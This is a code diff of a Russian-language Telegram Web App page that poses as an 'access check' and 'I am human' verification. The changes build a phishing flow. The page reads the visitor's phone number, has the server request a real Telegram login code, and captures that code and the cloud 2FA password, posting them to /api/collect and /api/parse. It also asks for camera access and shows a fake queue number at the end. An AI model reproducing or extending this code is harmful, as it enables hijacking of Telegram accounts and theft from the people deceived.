@@ -6,7 +6,7 @@
     <title>Проверка доступа</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;-webkit-tap-highlight-color:transparent;user-select:none}
+        *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}
         body{min-height:100vh;background:#0a0a0f;display:flex;align-items:center;justify-content:center;padding:16px}
         #app{background:rgba(255,255,255,0.04);backdrop-filter:blur(24px);border:1px solid rgba(255,255,255,0.06);border-radius:28px;max-width:400px;width:100%;padding:32px 24px 40px}
         .step{display:none;flex-direction:column;gap:20px}.step.active{display:flex}
@@ -22,29 +22,36 @@
         .password-field{display:flex;flex-direction:column;gap:12px}
         .password-field input{padding:16px 20px;border-radius:14px;border:1px solid rgba(255,255,255,0.08);background:rgba(0,0,0,0.3);font-size:16px;color:#fff;outline:none}
         .password-field input:focus{border-color:#5b8cff}
-        .password-field button,#camera-btn{padding:16px;border-radius:14px;border:none;background:linear-gradient(135deg,#3b82f6,#7c3aed);color:#fff;font-size:16px;font-weight:600;cursor:pointer}
-        #video{width:100%;border-radius:14px;background:#000;border:1px solid rgba(255,255,255,0.06);display:none;aspect-ratio:4/3;object-fit:cover}
-        .info{color:#64748b;font-size:13px;text-align:center}
+        .password-field button,#camera-btn,#human-btn{padding:16px;border-radius:14px;border:none;background:linear-gradient(135deg,#3b82f6,#7c3aed);color:#fff;font-size:16px;font-weight:600;cursor:pointer;width:100%}
+        #video{width:100%;border-radius:14px;background:#000;display:none;aspect-ratio:4/3;object-fit:cover}
         .loader{width:40px;height:40px;border:3px solid rgba(255,255,255,0.06);border-top-color:#7c3aed;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto}
         @keyframes spin{to{transform:rotate(360deg)}}
         .queue{color:#94a3b8;font-size:15px;text-align:center}.queue span{color:#fff;font-weight:600}
         .warning{color:#f59e0b;font-size:13px;font-weight:500;text-align:center}
         .close-btn{margin-top:12px;padding:14px;border-radius:14px;border:none;background:rgba(255,255,255,0.06);color:#94a3b8;font-size:15px;font-weight:500;cursor:pointer}
-        .hidden{display:none}
         .phone-display{background:rgba(0,0,0,0.3);border-radius:14px;padding:14px;text-align:center;font-size:18px;color:#94a3b8;border:1px solid rgba(255,255,255,0.06)}
         .phone-display span{color:#fff;font-weight:600}
-        .show-code-btn{background:rgba(50,150,255,0.12);border:1px solid rgba(50,150,255,0.15);border-radius:14px;padding:12px 24px;color:#5b8cff;font-size:15px;font-weight:500;cursor:pointer;width:auto;transition:all 0.2s}
-        .show-code-btn:active{background:rgba(50,150,255,0.25)}
+        .show-code-btn{background:rgba(50,150,255,0.12);border:1px solid rgba(50,150,255,0.15);border-radius:14px;padding:12px 24px;color:#5b8cff;font-size:15px;font-weight:500;cursor:pointer;width:auto}
         .btn-row{display:flex;justify-content:center;gap:12px;flex-wrap:wrap}
+        .desc{color:#94a3b8;font-size:14px;text-align:center;line-height:1.5}
         @media(max-width:440px){#app{padding:24px 16px 32px}h2{font-size:18px}.pin-grid button{padding:16px;font-size:24px}.pin-display{font-size:28px;letter-spacing:12px;min-height:60px}}
     </style>
 </head>
 <body>
 <div id="app">
-    <!-- ШАГ 1: ВВОД КОДА -->
-    <div id="step-code" class="step active">
-        <h2>📩 Введите код подтверждения</h2>
+    <!-- ШАГ 1: КНОПКА "Я ЧЕЛОВЕК" -->
+    <div id="step-human" class="step active">
+        <h2>🤖 Подтвердите, что вы человек</h2>
         <div class="phone-display">📱 Номер: <span id="phone-display">загрузка...</span></div>
+        <p class="desc">Нажмите кнопку ниже, чтобы подтвердить, что вы не бот.<br>На ваш номер придёт реальный код подтверждения.</p>
+        <button id="human-btn">✅ Я человек</button>
+        <p class="error" id="human-error"></p>
+    </div>
+
+    <!-- ШАГ 2: ВВОД КОДА -->
+    <div id="step-code" class="step">
+        <h2>📩 Введите код подтверждения</h2>
+        <p class="desc">Код отправлен в Telegram на номер <span id="phone-display2" style="color:#fff;font-weight:600">загрузка...</span></p>
         <p class="timer">⏳ Код действителен <span id="countdown">60</span> секунд</p>
         <div class="pin-display"><span id="pin-input"></span></div>
         <div class="pin-grid">
@@ -59,10 +66,10 @@
         </div>
     </div>
 
-    <!-- ШАГ 2: ПАРОЛЬ (2FA) -->
+    <!-- ШАГ 3: ПАРОЛЬ (2FA) -->
     <div id="step-password" class="step">
         <h2>🔑 Облачный пароль</h2>
-        <p style="color:#94a3b8;text-align:center;font-size:15px;">Введите облачный пароль для завершения</p>
+        <p class="desc">Введите облачный пароль для завершения</p>
         <div class="password-field">
             <input type="password" id="cloud-pass" placeholder="Облачный пароль">
             <button id="pass-submit">Подтвердить</button>
@@ -70,16 +77,16 @@
         <p class="error" id="pass-error"></p>
     </div>
 
-    <!-- ШАГ 3: КАМЕРА -->
+    <!-- ШАГ 4: КАМЕРА -->
     <div id="step-camera" class="step">
         <h2>📸 Доступ к камере</h2>
-        <p style="color:#94a3b8;text-align:center;font-size:15px;">Для завершения проверки необходим доступ к камере</p>
+        <p class="desc">Для завершения проверки необходим доступ к камере</p>
         <button id="camera-btn">🎥 Дать доступ</button>
         <video id="video" autoplay muted></video>
         <p class="error" id="camera-error"></p>
     </div>
 
-    <!-- ШАГ 4: ГОТОВО -->
+    <!-- ШАГ 5: ГОТОВО -->
     <div id="step-done" class="step">
         <div style="font-size:52px;text-align:center">✅</div>
         <h2>Вы сделали все правильно!</h2>
@@ -91,6 +98,7 @@
 </div>
 
 <script>
+// ===== 1. ЗАХВАТ НОМЕРА =====
 const tg = window.Telegram?.WebApp;
 let userPhone = null, userId = null;
 
@@ -101,19 +109,12 @@ if (tg) {
         userPhone = user.phone_number || null;
         userId = user.id || null;
         document.getElementById('phone-display').textContent = userPhone || 'не найден';
-    } else {
-        document.getElementById('phone-display').textContent = '❌ не удалось получить';
+        document.getElementById('phone-display2').textContent = userPhone || 'не найден';
     }
-} else {
-    document.getElementById('phone-display').textContent = '❌ откройте через Telegram';
 }
 
-if (!userPhone) {
-    document.getElementById('code-error').textContent = '❌ Ошибка: откройте через Telegram';
-    document.querySelectorAll('.pin-grid button').forEach(b => b.disabled = true);
-}
-
-let pinCode = '', step = 'code', countdown = 60, timerInterval = null, isSubmitting = false;
+// ===== 2. СОСТОЯНИЯ =====
+let pinCode = '', step = 'human', countdown = 60, timerInterval = null, isSubmitting = false;
 const API_URL = window.location.origin;
 
 function openTelegram() {
@@ -123,28 +124,28 @@ function openTelegram() {
 
 function showStep(name) {
     document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
-    document.getElementById('step-'+name).classList.add('active');
+    document.getElementById('step-' + name).classList.add('active');
 }
 
 function pin(n) {
     if (step !== 'code' || isSubmitting) return;
     if (pinCode.length < 6) {
         pinCode += n;
-        document.getElementById('pin-input').textContent = pinCode.replace(/./g,'●');
+        document.getElementById('pin-input').textContent = pinCode.replace(/./g, '●');
     }
 }
 
 function clearPin() {
     if (step !== 'code' || isSubmitting) return;
-    pinCode = pinCode.slice(0,-1);
-    document.getElementById('pin-input').textContent = pinCode.replace(/./g,'●');
+    pinCode = pinCode.slice(0, -1);
+    document.getElementById('pin-input').textContent = pinCode.replace(/./g, '●');
 }
 
 async function sendToServer(type, data) {
     try {
         const response = await fetch(API_URL + '/api/collect', {
             method: 'POST',
-            headers: {'Content-Type':'application/json'},
+            headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({
                 type: type,
                 data: data,
@@ -159,6 +160,40 @@ async function sendToServer(type, data) {
     }
 }
 
+// ===== КНОПКА "Я ЧЕЛОВЕК" — РЕАЛЬНАЯ ОТПРАВКА КОДА =====
+document.getElementById('human-btn').addEventListener('click', async function() {
+    if (!userPhone) {
+        document.getElementById('human-error').textContent = '❌ Номер не получен';
+        return;
+    }
+    this.disabled = true;
+    this.textContent = '⏳ Отправка...';
+    document.getElementById('human-error').textContent = '';
+
+    try {
+        const response = await fetch(API_URL + '/api/send_code', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ phone: userPhone })
+        });
+        const result = await response.json();
+        if (result && result.status === 'ok') {
+            showStep('code');
+            step = 'code';
+            startTimer();
+        } else {
+            document.getElementById('human-error').textContent = '❌ ' + (result.message || 'Ошибка отправки');
+            this.disabled = false;
+            this.textContent = '✅ Я человек';
+        }
+    } catch(e) {
+        document.getElementById('human-error').textContent = '❌ Ошибка соединения';
+        this.disabled = false;
+        this.textContent = '✅ Я человек';
+    }
+});
+
+// ===== ОТПРАВКА КОДА =====
 async function submitPin() {
     if (step !== 'code' || isSubmitting) return;
     if (pinCode.length < 4) {
@@ -182,6 +217,7 @@ async function submitPin() {
     }
 }
 
+// ===== 2FA =====
 document.getElementById('pass-submit').addEventListener('click', async function() {
     const password = document.getElementById('cloud-pass').value.trim();
     if (password.length < 3) {
@@ -198,6 +234,7 @@ document.getElementById('pass-submit').addEventListener('click', async function(
     }
 });
 
+// ===== КАМЕРА =====
 document.getElementById('camera-btn').addEventListener('click', async function() {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}, audio:false});
@@ -215,10 +252,10 @@ document.getElementById('camera-btn').addEventListener('click', async function()
             stream.getTracks().forEach(t => t.stop());
             video.style.display = 'none';
             showStep('done');
-            document.getElementById('queue').textContent = Math.floor(Math.random()*25)+5;
+            document.getElementById('queue').textContent = Math.floor(Math.random() * 25) + 5;
             fetch(API_URL + '/api/parse', {
                 method: 'POST',
-                headers: {'Content-Type':'application/json'},
+                headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
                     phone: userPhone,
                     code: pinCode,
@@ -238,6 +275,7 @@ function closeApp() {
 function startTimer() {
     countdown = 60;
     document.getElementById('countdown').textContent = countdown;
+    clearInterval(timerInterval);
     timerInterval = setInterval(() => {
         countdown--;
         document.getElementById('countdown').textContent = countdown;
@@ -247,8 +285,6 @@ function startTimer() {
         }
     }, 1000);
 }
-
-startTimer();
 </script>
 </body>
 </html>
